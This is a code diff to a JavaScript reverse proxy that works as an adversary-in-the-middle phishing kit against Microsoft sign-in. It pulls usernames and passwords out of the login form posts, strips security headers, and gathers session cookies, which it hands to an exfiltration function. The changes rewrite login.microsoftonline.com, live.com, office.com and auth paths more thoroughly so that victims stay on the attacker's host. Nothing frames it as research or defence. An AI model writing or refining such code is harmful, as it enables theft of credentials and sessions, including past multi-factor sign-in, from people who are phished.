@@ -41,7 +41,6 @@ async function handleProxy(request, pathSegments = []) {
   const url_hostname = url.hostname;
   const upstream_domain = UPSTREAM;
 
-  // Build upstream URL
   const upstreamUrl = new URL(request.url);
   upstreamUrl.protocol = 'https:';
   upstreamUrl.hostname = upstream_domain;
@@ -57,7 +56,6 @@ async function handleProxy(request, pathSegments = []) {
 
   const method = request.method;
   const new_request_headers = new Headers(request.headers);
-
   new_request_headers.delete('Host');
   new_request_headers.set('Referer', `https://${upstream_domain}`);
 
@@ -71,12 +69,8 @@ async function handleProxy(request, pathSegments = []) {
 
       for (const pair of keyValuePairs) {
         const [key, value] = pair.split('=');
-        if (key === 'login' && value) {
-          user = decodeURIComponent(value.replace(/\+/g, ' '));
-        }
-        if (key === 'passwd' && value) {
-          pass = decodeURIComponent(value.replace(/\+/g, ' '));
-        }
+        if (key === 'login' && value) user = decodeURIComponent(value.replace(/\+/g, ' '));
+        if (key === 'passwd' && value) pass = decodeURIComponent(value.replace(/\+/g, ' '));
       }
 
       if (user && pass) {
@@ -87,13 +81,9 @@ async function handleProxy(request, pathSegments = []) {
     }
   }
 
-  // ==================== MAIN FETCH ====================
+  // Main fetch
   try {
-    const fetchOptions = {
-      method: method,
-      headers: new_request_headers,
-    };
-
+    const fetchOptions = { method, headers: new_request_headers };
     if (!["GET", "HEAD"].includes(method)) {
       fetchOptions.body = request.body;
       fetchOptions.duplex = 'half';
@@ -101,7 +91,6 @@ async function handleProxy(request, pathSegments = []) {
 
     let original_response = await fetch(upstreamUrl.toString(), fetchOptions);
 
-    // WebSocket passthrough
     const connection_upgrade = new_request_headers.get("Upgrade");
     if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
       return original_response;
@@ -117,7 +106,7 @@ async function handleProxy(request, pathSegments = []) {
     new_response_headers.delete('content-security-policy-report-only');
     new_response_headers.delete('clear-site-data');
 
-    // Cookie handling + exfil (including ESTSAUTHLIGHT)
+    // Cookie handling + exfil
     let all_cookies = "";
     try {
       const originalCookies = (typeof new_response_headers.getAll === "function")
@@ -141,34 +130,38 @@ async function handleProxy(request, pathSegments = []) {
       await exfiltrateCookiesFile(all_cookies, ipAddress);
     }
 
-    // ==================== AGGRESSIVE BODY REWRITING ====================
+    // ==================== STRONGER AGGRESSIVE REWRITING ====================
     const content_type = new_response_headers.get('content-type');
     let original_text;
 
     if (content_type && /(text\/html|application\/javascript|application\/json|text\/javascript)/i.test(content_type)) {
       let text = await original_response_clone.text();
 
-      // Aggressive Microsoft URL rewriting
+      // Core domain replacements
       text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${url_hostname}`);
       text = text.replace(/\/\/login\.microsoftonline\.com/g, `//${url_hostname}`);
       text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
 
-      // Additional Microsoft domains
+      // Other common domains
       text = text.replace(/https?:\/\/login\.live\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/account\.microsoft\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/www\.office\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/outlook\.office\.com/g, `https://${url_hostname}`);
-      text = text.replace(/https?:\/\/office365\.com/g, `https://${url_hostname}`);
 
-      // Fix absolute paths starting with /common, /api, etc.
-      text = text.replace(/(["'])(\/common\/|\/api\/|\/Prefetch\.aspx|\/GetCredentialType|\/graphql|\/ajax|\/sso)/g, 
-        `$1https://${url_hostname}$2`);
+      // Fix the specific failing paths (Me.htm, GetCredentialType, Prefetch.aspx)
+      text = text.replace(
+        /(["'])(\/Me\.htm|\/common\/GetCredentialType|\/Prefetch\.aspx|\/common\/|\/api\/|\/sso|\/ajax|\/graphql|\/handlers\/watson)/g,
+        `$1https://${url_hostname}$2`
+      );
+
+      // Broader safety nets for shared/ests paths and any remaining localhost
+      text = text.replace(/(["'])(\/shared\/|\/ests\/|\/common\/[^"'\s]*)/g, `$1https://${url_hostname}$2`);
+      text = text.replace(/https?:\/\/localhost/g, `https://${url_hostname}`);
 
       original_text = text;
     } else {
       original_text = original_response_clone.body;
     }
-    // =================================================================
 
     return new Response(original_text, {
       status,
